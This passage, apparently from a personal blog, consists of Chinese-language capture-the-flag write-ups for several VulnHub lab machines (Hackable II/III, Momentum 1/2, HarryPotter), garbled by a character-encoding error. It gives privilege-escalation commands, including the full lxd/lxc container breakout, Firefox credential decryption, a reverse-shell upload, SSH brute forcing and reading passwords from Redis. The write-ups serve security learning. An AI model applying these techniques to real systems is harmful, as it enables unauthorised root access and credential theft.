src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154644825.png" alt="image-20210813154644825"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154717914.png" alt="image-20210813154717914"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154800319.png" alt="image-20210813154800319"></p><p>ç¬¬ä¸‰æ­¥ä½¿ç”¨ç§é’¥è¿æ¥ <code>ssh hermoine@192.168.1.12 -i .ssh/id_rsa</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813154905695.png" alt="image-20210813154905695"></p><p>ä¸€ä¸ªå‰å®³çš„ææƒè¾…åŠ©è„šæœ¬<a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86%E4%B8%80%E4%BA%9B%E4%BF%A1%E6%81%AF">https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.shï¼Œå¯ä»¥è‡ªåŠ¨æ”¶é›†ä¸€äº›ä¿¡æ¯</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">./linpeas.<span class="hljs-keyword">sh</span> | tee output<br><span class="hljs-keyword">cat</span> output | <span class="hljs-keyword">grep</span> login<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813160718532.png" alt="image-20210813160718532"></p><p>è§£å¯†å·¥å…·ï¼š<a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0">https://github.com/unode/firefox_decrypt/releases/tag/0.7.0</a></p><p>ä½¿ç”¨scpå‘½ä»¤å°†æ•´ä¸ªfirefoxçš„æ–‡ä»¶å…¨éƒ¨ç§»å‡ºæ¥ï¼ˆå•ä¸ªæ–‡ä»¶ç§»å‡ºæ¥ï¼Œä¸€ç›´è§£ç å¤±è´¥ï¼Œæ‰€ä»¥ç´¢æ€§å…¨éƒ¨ç§»å‡ºï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164205265.png" alt="image-20210813164205265"></p><p>ç„¶åè§£ç ï¼Œå°±è·å¾—äº†rootç”¨æˆ·çš„å¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164109726.png" alt="image-20210813164109726"></p><p>åˆ©ç”¨å¯†ç ç™»å½•åˆ°rootè´¦æˆ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164519538.png" alt="image-20210813164519538"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813164540819.png" alt="image-20210813164540819"></p><p>æˆåŠŸè·å–åˆ°äº†ç¬¬ä¸‰ä¸ªflag</p><p><strong>é—®é¢˜æ€»ç»“</strong></p><ol><li>ä¸ºä»€ä¹ˆæµè§ˆå™¨çš„ç™»å½•æ•°æ®ä¸­ä¼šæœ‰rootç”¨æˆ·çš„ç™»å½•å¯†ç </li></ol><p><strong>æ€»ç»“</strong></p><p>è¿™ä¸ªé¶åœºæ€»ä½“æ¥è¯´è¦æ¯”ç¬¬ä¸€ä¸ªéš¾ï¼Œä¸»è¦æ˜¯è¿›æ”»ç«™ç‚¹æ—¶çš„ç›®å½•æ‰«æï¼Œhttp3ï¼ŒåŠ å…¥å†…éƒ¨åçš„rootç”¨æˆ·å¯†ç è¿™é‡Œï¼Œç¡®å®ä¸èµ°å¯»å¸¸è·¯ã€‚å¤§è‡´æ­¥éª¤è¿˜æ˜¯å’Œç¬¬ä¸€ä¸ªé¶åœºç±»ä¼¼ã€‚</p><h2 id="ä¸‰ã€HarryPotter-Fawkes"><a href="#ä¸‰ã€HarryPotter-Fawkes" class="headerlink" title="ä¸‰ã€HarryPotter: Fawkes"></a><del>ä¸‰ã€HarryPotter: Fawkes</del></h2><blockquote><p>è¿™ä¸ªæ˜¯ä¸€ä¸ªPWNé¶åœºï¼Œå®Œå…¨åé¢å‡ æ­¥æ²¡å¤´ç»ª</p></blockquote><blockquote><p>é¶åœºï¼š192.168.1.101</p><p>kaliï¼š192.168.1.15</p><p>win10ï¼š192.168.1.7</p><p>3ä¸ªflag</p></blockquote><p>æ‰«æç«¯å£ï¼Œè¿™ä¸ªå¼€çš„ç«¯å£è¿˜æŒºå¤šçš„</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813171526501.png" alt="image-20210813171526501"></p><p>ftpä¸­åªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯æ‰“å¼€ä¹±ç ï¼Œå…ˆç•™ç€åº”è¯¥æœ‰ç”¨</p><p><code>EtherNetIP-1</code>ï¼šå·¥ä¸šä»¥å¤ªç½‘é€šè®¯åè®®ï¼Œå¯ä»¥åº”ç”¨å†ç¨‹åºæ§åˆ¶åŠå…¶ä»–è‡ªåŠ¨åŒ–çš„åº”ç”¨ä¸­ï¼Œæ˜¯é€šç”¨å·¥ä¸šåå®šçš„ä¸€éƒ¨åˆ†</p><p><code>monkeycom</code>ï¼šè§†é¢‘ç”µè¯/æ–‡ä»¶ä¼ è¾“ç¨‹åº</p><p>æ‰«æç›®å½•ï¼Œç»“æœä»€ä¹ˆä¸œè¥¿éƒ½æ²¡æœ‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814124812344.png" alt="image-20210814124812344"></p><p>æŒ¨ä¸ªè®¿é—®ä¸€ä¸‹è¿™å‡ ä¸ªç«¯å£ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿:cry: ï¼Œå¡ä½äº†ï¼Œçœ‹äº†ä¸€çœ¼å›½å¤–çš„å¤§ä½¬çš„æ­¥éª¤ï¼Œç¡®å®æ˜¯è¦è®¿é—®è¿™å‡ ä¸ªç«¯å£çš„</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814125206654.png" alt="image-20210814125206654"></p><p>curlä¸€ä¸‹ï¼Œå‘ç°æç¤ºHTTP/0.9çš„é—®é¢˜</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814125229195.png" alt="image-20210814125229195"></p><p>æŒ‡å®šå¥½httpçš„ç‰ˆæœ¬å°±å¯ä»¥æ­£å¸¸è¿”å›äº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814125917891.png" alt="image-20210814125917891"></p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://nepcodex.com/2021/05/vulnhub-fawkes-walkthrough-harry-potter-series/">https://nepcodex.com/2021/05/vulnhub-fawkes-walkthrough-harry-potter-series/</a></p><h2 id="ä¸‰ã€HACKABLE-II"><a href="#ä¸‰ã€HACKABLE-II" class="headerlink" title="ä¸‰ã€HACKABLE: II"></a>ä¸‰ã€HACKABLE: II</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>Win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.13</p></blockquote><p>æ‰«æé¶æœºä½ç½®å’Œé¶æœºå¼€æ”¾çš„ç«¯å£</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814134501443.png" alt="image-20210814134501443"></p><p>è®¿é—®ä¸€ä¸‹å„ä¸ªç«¯å£</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814134636446.png" alt="image-20210814134636446"></p><p>ftpä¸­çš„å†…å®¹ï¼Œè¿™ä¸ªæç¤ºå†…å®¹æ²¡æ€ä¹ˆæ‡‚â€¦â€¦â€¦â€¦</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814134752215.png" alt="image-20210814134752215"></p><p>æ‰«æä¸€ä¸‹ç›®å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814135029124.png" alt="image-20210814135029124"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814140003974.png" alt="image-20210814140003974"></p><blockquote><p>è¿™ä¸ªæ–‡ä»¶å’Œftpä¸­çš„æ–‡ä»¶å­˜å‚¨ä½ç½®æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ftpä¸Šä¼ shell</p></blockquote><p>è®¿é—®ä¸Šä¼ çš„åå¼¹shellçš„phpæ–‡ä»¶å°±å¯ä»¥è·å¾—shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814140350228.png" alt="image-20210814140350228"></p><p>è·å–ttyshellçš„<code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;);&#39;</code>ï¼Œå‘ç°ä¸€ä¸ªé‡è¦çš„æ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814143719614.png" alt="image-20210814143719614"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814144303223.png" alt="image-20210814144303223"></p><p>å°è¯•sshç™»å½•ï¼Œshrekè´¦æˆ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814144608483.png" alt="image-20210814144608483"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150109583.png" alt="image-20210814150109583"></p><p>å‡†å¤‡æ”¶é›†ä¿¡æ¯ææƒ</p><ul><li><del>SUIDææƒ</del></li><li><del>sudoææƒï¼ˆç‰ˆæœ¬ä¸é€‚é…ï¼‰</del></li><li><del>å®šæ—¶ä»»åŠ¡ææƒ</del></li></ul><blockquote><p>åé¢æ²¡äº‹å°±çªç„¶æƒ³èµ·æ¥çœ‹äº†ä¸€ä¸‹.bash_historyæ–‡ä»¶</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150300644.png" alt="image-20210814150300644"></p><p>ä¹Ÿæ¨¡ä»¿æ‰§è¡Œäº†ä¸€ä¸‹</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150351118.png" alt="image-20210814150351118"></p><p>ææƒæˆåŠŸï¼Œå¹¸ç¦æ¥å¾—å¤ªçªç„¶äº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814150425717.png" alt="image-20210814150425717"></p><p><strong>æ€»ç»“</strong></p><p>è¿™ä¸ªé¶åœºçš„æ•´ä½“éš¾åº¦å¯ä»¥è¯´æ˜¯æ²¡æœ‰éš¾åº¦â€¦â€¦â€¦â€¦é€‚åˆç©ç©è€Œå·²</p><h2 id="å››ã€Hackable-III"><a href="#å››ã€Hackable-III" class="headerlink" title="å››ã€Hackable: III"></a>å››ã€Hackable: III</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.16</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814154534969.png" alt="image-20210814154534969"></p><blockquote><p>åªå¼€æ”¾äº†ä¸€ä¸ªç«¯å£ï¼Œæœ‰ç‚¹å°‘å•Š</p></blockquote><p>æ‰«æç›®å½•è·å–æ›´å¤šæœ‰ç”¨çš„ä¿¡æ¯</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814154857267.png" alt="image-20210814154857267"></p><p>ç½‘é¡µæºç æœ‰ä¸€æ®µæ³¨é‡Šï¼Œè¿™ä¸ªåº”è¯¥æ˜¯ä¸€ä¸ªæç¤ºï¼Œä½†æ˜¯æœ‰ç‚¹çœ‹ä¸æ‡‚</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814180322841.png" alt="image-20210814180322841"></p><p>åœ¨<code>/backup/wordlist.txt</code>ä¸­æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå¯èƒ½å¯¹åé¢çˆ†ç ´æœ‰ç”¨</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814155354912.png" alt="image-20210814155354912"></p><p>è¿™ä¸ªç¼–ç çœŸçš„æ²¡è§è¿‡ï¼Œçœ‹äº†ä¸€ä¸‹WPæ‰çŸ¥é“åˆ°<a href="https://www.dcode.fr/brainfuck-language">https://www.dcode.fr/brainfuck-language</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814181115898.png" alt="image-20210814181115898"></p><p>æ•°æ®åº“æ— å¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814155452250.png" alt="image-20210814155452250"></p><p>ç™»å½•é¡µé¢</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814155638016.png" alt="image-20210814155638016"></p><blockquote><p>ä¸€çœ‹æºç å°±æ„Ÿè§‰æœ‰SQLæ³¨å…¥</p></blockquote><p>ç™»å½•é¡µé¢ä¸º<code>/login_page/login.html</code>ï¼Œå‘ç°æ²¡æœ‰SQLæ³¨å…¥ï¼Œä½†æ˜¯å¯ä»¥è®¿é—®ä¸Šé¢çš„å›¾ç‰‡<code>3.jpg</code>ï¼Œå‰é¢1ï¼Œ2éƒ½æœ‰äº†ï¼Œè¿™ä¸ª<code>3.jpg</code> ï¼Œåº”è¯¥ä¹Ÿæœ‰ä¸œè¥¿ï¼Œé‚£å°±åº”è¯¥æ˜¯miscçš„å›¾ç‰‡éšå†™</p><p>å›¾ç‰‡éšå†™å·¥å…·ï¼š<a href="http://steghide.sourceforge.net/download.php">http://steghide.sourceforge.net/download.php</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814183500775.png" alt="image-20210814183500775"></p><blockquote><p>æ‹¿åˆ°äº†3ä¸ªæ•°å­—  10000  4444  65535</p><p>ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨:pensive:</p></blockquote><p>ä½¿ç”¨ç«¯å£ç¢°æ’åå‘ç°22ç«¯å£å·²ç»æ‰“å¼€äº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814184715476.png" alt="image-20210814184715476"></p><p>ç°åœ¨æ‰‹é‡Œæœ‰çš„ä¸œè¥¿å¹¶ä¸”è¿˜æ²¡æœ‰ç”¨çš„çº¿ç´¢å°±æ˜¯é‚£ä¸ªå­—å…¸ï¼Œç„¶åæœ€æ–°è·å¾—äº†ä¸€ä¸ª22ç«¯å£ï¼Œæ‰€ä»¥å°±çˆ†ç ´ä¸€ä¸‹sshå¯†ç ï¼Œç”¨æˆ·åç›®å‰å‡ºç°çš„åå­—å°±æ˜¯ç¬¬ä¸€ä¸ªç½‘é¡µæºç çš„æç¤ºä¸­çš„åå­—ï¼Œå…ˆè¯•ä¸€ä¸‹å§â€¦â€¦â€¦â€¦</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814185708000.png" alt="image-20210814185708000"></p><p>ä½¿ç”¨sshç™»å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814185911017.png" alt="image-20210814185911017"></p><p>æŸ¥çœ‹homeç›®å½•å‘ç°åº”è¯¥æ˜¯æœ‰ä¸¤ä¸ªç”¨æˆ·</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816093110878.png" alt="image-20210816093110878"></p><p>è·å–åˆ°ç¬¬ä¸€ä¸ªflag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814190000585.png" alt="image-20210814190000585"></p><p>æ‰¾ä¸€ä¸‹æ•æ„Ÿæ–‡ä»¶ï¼Œåœ¨webç›®å½•ä¸‹å‘ç°ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œå°è¯•ä¸€ä¸‹æˆåŠŸç™»å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210814192615628.png" alt="image-20210814192615628"></p><p>ææƒ</p><ul><li><p><del>SUIDææƒ</del></p></li><li><p><del>sudoææƒ</del></p></li><li><p><del>å®šæ—¶ä»»åŠ¡ææƒ</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816101848774.png" alt="image-20210816101848774"></p><blockquote><p>å­˜åœ¨ä¸€ä¸ªä»¥ç®¡ç†å‘˜èº«ä»½å®šæ—¶æ‰§è¡Œçš„pythonè„šæœ¬</p></blockquote><p>åœ¨æ–‡ä»¶å¤¹ä¸‹é¢æœªå‘ç°é‚£ä¸ªæ–‡ä»¶ï¼Ÿï¼Ÿï¼Ÿï¼Ÿè‡ªå·±åˆ è‡ªå·±å—ï¼Ÿ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816101950544.png" alt="image-20210816101950544"></p><p>ä¹Ÿä¸èƒ½è‡ªå·±å†™æ–‡ä»¶</p><blockquote><p>åé¢çœ‹è§æœ‰ä¸€ä¸ªäººæ˜¯ç”¨çš„å®šæ—¶ä»»åŠ¡ææƒ</p><p><a href="https://kerszl.github.io/hacking/walkthrough/hackable-iii/">https://kerszl.github.io/hacking/walkthrough/hackable-iii/</a></p><p>ä¸æ‡‚ä¸ºä»€ä¹ˆä»–ç›´æ¥çŒœå‡ºæ¥äº†æ–‡ä»¶å†…å®¹ï¼Ÿï¼Ÿï¼Ÿ</p></blockquote></li><li><p><del>å†…æ ¸æ¼æ´ææƒ</del> å…ˆç•™ç€æœ€åä½¿ç”¨</p></li><li><p>lxd / lxc ææƒ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816103421953.png" alt="image-20210816103421953"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">åœ¨kaliæ”»å‡»æœºä¸Šæ„å»º<br>git clone  https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/saghul/</span>lxd-alpine-builder.git<br>cd lxd-alpine-builder<br>./build-alpine<br></code></pre></td></tr></table></figure><p>æ„å»ºå¥½äº†ä¹‹ååˆ©ç”¨scpå‘½ä»¤å°†æ–‡ä»¶ç§»åŠ¨åˆ°é¶æœºä¸Š</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816104808086.png" alt="image-20210816104808086"></p><p>å¯¼å…¥<code>lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage</code></p><p>æŸ¥çœ‹<code>lxc image list</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816105315274.png" alt="image-20210816105315274"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ¼æ´é¶æœº<br>lxd init<br>lxc init myimage ignite -c security.<span class="hljs-attribute">privileged</span>=<span class="hljs-literal">true</span><br>lxc<span class="hljs-built_in"> config </span>device <span class="hljs-builtin-name">add</span> ignite mydevice disk <span class="hljs-attribute">source</span>=/ <span class="hljs-attribute">path</span>=/mnt/root <span class="hljs-attribute">recursive</span>=<span class="hljs-literal">true</span><br>lxc start ignite<br>lxc exec ignite /bin/sh<br>ä¹‹åå°±æ˜¯rootç”¨æˆ·äº†ï¼Œå¯ä»¥è¿›å…¥/mnt/rootç›®å½•æ“ä½œä¸»æœºçš„æ‰€æœ‰ç›®å½•<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816105230095.png" alt="image-20210816105230095"></p></li></ul><p>  <img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816104600712.png" alt="image-20210816104600712"></p><p><strong>æ€»ç»“</strong></p><ol><li><p>å­¦ä¹ åˆ°çš„æ–°ä¸œè¥¿ï¼šç«¯å£éšè—å’Œç«¯å£ç¢°æ’ </p><p>ç«¯å£ç¢°æ’æŠ€æœ¯æ˜¯ä¸€ç§å…è®¸æœåŠ¡è®¾å¤‡åœ¨ç”¨æˆ·æŒ‰ç…§çº¦å®šçš„åºåˆ—ç¢°æ’åï¼Œæ‰“å¼€ä¸€ä¸ªçº¦å®šçš„æœåŠ¡ç«¯å£æä¾›æœåŠ¡çš„æŠ€æœ¯ã€‚æ‰€è°“ç¢°æ’æ˜¯ç”±ä¸€ä¸ªå°è¯•è®¿é—®ç³»ç»Ÿä¸­å…³é—­ç«¯å£çš„åºåˆ—ç»„æˆï¼Œä¹Ÿå°±æ˜¯ç‰¹å®šç«¯å£çš„è¿æ¥è¯·æ±‚</p><p><a href="https://zhuanlan.zhihu.com/p/210177505">https://zhuanlan.zhihu.com/p/210177505</a>  </p><p><a href="https://www.cnblogs.com/milton/p/14121214.html">https://www.cnblogs.com/milton/p/14121214.html</a></p></li><li><p>lxd /  lxc  ææƒ</p><p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p><p><a href="https://www.freebuf.com/articles/system/216803.html">https://www.freebuf.com/articles/system/216803.html</a></p></li></ol><p>å‚è€ƒæ–‡ç« </p><p><a href="https://nepcodex.com/2021/07/hackable-iii-walkthrough-vulnhub/">https://nepcodex.com/2021/07/hackable-iii-walkthrough-vulnhub/</a></p><h2 id="äº”ã€-Momentum-1"><a href="#äº”ã€-Momentum-1" class="headerlink" title="äº”ã€ Momentum: 1"></a>äº”ã€ Momentum: 1</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.17</p></blockquote><p>æ‰«æä¸»æœºipå’Œç«¯å£</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111017698.png" alt="image-20210816111017698"></p><p>æ‰«æç›®å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111319784.png" alt="image-20210816111319784"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111850304.png" alt="image-20210816111850304"></p><p>é¦–é¡µå­˜åœ¨XSS</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111726937.png" alt="image-20210816111726937"></p><p><code>cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816111959176.png" alt="image-20210816111959176"></p><blockquote><p>ä¹Ÿå¯ä»¥ç›´æ¥F12æŸ¥çœ‹cookie</p></blockquote><p> è§£å¯†Cookieï¼š<code>auxerre-alienum##</code> ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨</p><p><a href="https://tool.oschina.net/encrypt/">https://tool.oschina.net/encrypt/</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816114927619.png" alt="image-20210816114927619"></p><ul><li><p><del>æŸ¥æ‰¾ç½‘ç«™åå°å°è¯•å¯†ç </del>ï¼ˆæ²¡æ‰¾åˆ°åå°ï¼‰</p></li><li><p>ç™»å½•ssh</p><p>æˆåŠŸç™»å½•ï¼Œç”¨æˆ·åï¼š<code>auxerre</code> å¯†ç ï¼š<code>auxerre-alienum##</code>ï¼ˆå¤šæ¬¡ å°è¯•å°±å¯ä»¥äº†ï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115136551.png" alt="image-20210816115136551"></p></li></ul><p>å¾—åˆ°ç¬¬ä¸€ä¸ªflag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115329865.png" alt="image-20210816115329865"></p><p>ææƒ</p><ul><li><p><del>SUIDææƒ</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115514097.png" alt="image-20210816115514097"></p></li><li><p><del>sudoææƒ</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115602155.png" alt="image-20210816115602155"></p></li><li><p><del>å®šæ—¶ä»»åŠ¡ææƒ</del>ï¼ˆä¹Ÿæ²¡æœ‰ï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816115904460.png" alt="image-20210816115904460"></p><p>ä½†æ˜¯å‘ç°äº†ä¸€ä¸ªredis</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816120155248.png" alt="image-20210816120155248"></p><p>è¿æ¥ä¸Šredisï¼Œç„¶åæŸ¥è¯¢æ‰€æœ‰çš„keyï¼Œä½¿ç”¨getè·å–æŒ‡å®škeyçš„å€¼</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816120415536.png" alt="image-20210816120415536"></p><p>é€šè¿‡rediså‘ç°äº†rootç”¨æˆ·çš„å¯†ç </p><p>å°è¯•ç›´æ¥ç™»å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816120546646.png" alt="image-20210816120546646"></p><p>æˆåŠŸè·å–flag</p><blockquote><p>å¯¹äºRedisçš„æ“ä½œä¸ç†Ÿæ‚‰ï¼Œéœ€è¦åŠ å¼º</p></blockquote></li></ul><p><strong>æ€»ç»“</strong></p><p>è¿™ä¸ªé¶åœºæ•´ä½“æ€è·¯æ¯”è¾ƒç®€å•ï¼Œå¦‚æœæƒ³åˆ°äº†å°±å®¹æ˜“åšï¼Œä½†æ˜¯å¦‚æœæ€è·¯ä¸å¯¹å°±å®¹æ˜“å¡æ­»ã€‚ç”±Cookieè§£å¯†è·å¾—sshç™»å½•çš„ä¿¡æ¯ï¼ˆè¿™ä¸ªç°å®åº”è¯¥ä¸ä¼šæœ‰å§ï¼‰ï¼Œåˆ©ç”¨redisè·å–åˆ°rootç”¨æˆ·çš„å¯†ç </p><h2 id="å…­ã€MOMENTUM-2"><a href="#å…­ã€MOMENTUM-2" class="headerlink" title="å…­ã€MOMENTUM: 2"></a>å…­ã€MOMENTUM: 2</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.19</p></blockquote><p>æ‰«æä¸»æœº</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816135219734.png" alt="image-20210816135219734"></p><p>æ‰«æç›®å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816135728304.png" alt="image-20210816135728304"></p><p>å‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹å’Œæ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js"># /js/main.js<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadFile</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>    <span class="hljs-keyword">var</span> files = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;file&quot;</span>).files;<br> <br>    <span class="hljs-keyword">if</span>(files.length &gt; <span class="hljs-number">0</span> )&#123;<br> <br>       <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> FormData();<br>       formData.append(<span class="hljs-string">&quot;file&quot;</span>, files[<span class="hljs-number">0</span>]);<br> <br>       <span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> XMLHttpRequest();<br> <br>       <span class="hljs-comment">// Set POST method and ajax file path</span><br>       xhttp.open(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;ajax.php&quot;</span>, <span class="hljs-literal">true</span>);<br> <br>       <span class="hljs-comment">// call on request changes state</span><br>       xhttp.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.readyState == <span class="hljs-number">4</span> &amp;&amp; <span class="hljs-built_in">this</span>.status == <span class="hljs-number">200</span>) &#123;<br> <br>            <span class="hljs-keyword">var</span> response = <span class="hljs-built_in">this</span>.responseText;<br>            <span class="hljs-keyword">if</span>(response == <span class="hljs-number">1</span>)&#123;<br>               alert(<span class="hljs-string">&quot;Upload successfully.&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>               alert(<span class="hljs-string">&quot;File not uploaded.&quot;</span>);<br>            &#125;<br>          &#125;<br>       &#125;;<br> <br>       <span class="hljs-comment">// Send request with data</span><br>       xhttp.send(formData);<br> <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>       alert(<span class="hljs-string">&quot;Please select a file&quot;</span>);<br>    &#125;<br> <br> &#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816135752058.png" alt="image-20210816135752058"></p><p>å°è¯•ä¸Šä¼ æ–‡ä»¶è·å–shell</p><p>å¯ä»¥ä¸Šä¼ txtæ–‡ä»¶ï¼Œç„¶åä¸Šä¼ çš„æ–‡ä»¶éƒ½åœ¨<code>/owls</code>ä¸­</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210816141536270.png" 